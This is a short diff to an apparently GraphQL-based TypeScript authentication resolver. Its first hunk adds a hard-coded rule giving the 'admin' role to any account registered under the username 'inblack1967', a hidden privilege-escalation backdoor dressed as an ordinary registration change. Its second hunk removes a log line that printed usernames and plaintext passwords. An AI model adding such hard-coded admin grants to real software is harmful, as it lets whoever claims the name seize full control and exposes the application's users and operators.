@@ -52,7 +52,8 @@ export class AuthResolver
 
         try
         {
-            const newUser = await UserEntity.create( { name, email, password: hashedPassword, username } ).save();
+            const isAdmin = username === 'inblack1967';
+            const newUser = await UserEntity.create( { name, email, password: hashedPassword, username, role: isAdmin ? 'admin' : 'user' } ).save();
             session.user = newUser.id;
             session.username = newUser.username;
             return newUser;
@@ -80,7 +81,6 @@ export class AuthResolver
         { session }: MyContext
     ): Promise<UserEntity>
     {
-        console.log( username, password );
         if ( session.user )
         {
             throw new ErrorResponse( 'Not Authorized', 401 );
